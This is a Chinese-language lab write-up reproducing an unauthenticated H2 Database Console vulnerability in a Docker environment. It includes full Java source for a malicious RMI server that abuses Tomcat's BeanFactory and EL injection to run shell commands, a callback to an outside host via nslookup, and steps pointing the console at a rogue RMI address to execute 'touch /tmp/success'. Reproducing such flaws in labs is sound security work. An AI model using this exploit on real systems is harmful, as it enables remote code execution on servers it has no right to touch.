# H2 Database Console 未授权访问

## 漏洞环境

执行如下命令启动一个Springboot + h2database环境：

```plain
docker compose up -d
```

启动后，访问http://your-ip:8080/h2-console/即可查看到H2 database的管理页面。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780878540582-6cacb618-d2d1-480f-8d88-66a96547802b.png)

## 漏洞复现

目标环境是Java 8u252，版本较高，因为上下文是Tomcat环境，我们可以参考《[Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java#tdsub)》，使用org.apache.naming.factory.BeanFactory加EL表达式注入的方式来执行任意命令。

```plain
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServerNew {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"));
 
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
```

我们可以借助这个小工具[JNDI](https://github.com/JosephTribbianni/JNDI#tdsub)简化我们的复现过程。

首先设置JNDI工具中执行的命令为touch /tmp/success：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780878540729-2dc2913c-1a38-4793-aa08-d99f6682ac5f.png)

然后启动JNDI-1.0-all.jar，在h2 console页面填入JNDI类名和URL地址：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780878540882-5b77add8-18a7-40d7-9bc6-c40b43b29b84.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780878540740-13c0f21f-9fa4-473e-93ca-e9b5bf30cb24.png)

其中，javax.naming.InitialContext是JNDI的工厂类，URL rmi://evil:23456/BypassByEL是运行JNDI工具监听的RMI地址。

点击连接后，恶意RMI成功接收到请求：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780878540848-08cb1c31-e0da-4a39-8e8d-7e139c6f0add.png)

touch /tmp/success已成功执行：![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780878541713-5356baf1-fb3e-42c8-b227-cb52e1b01029.png)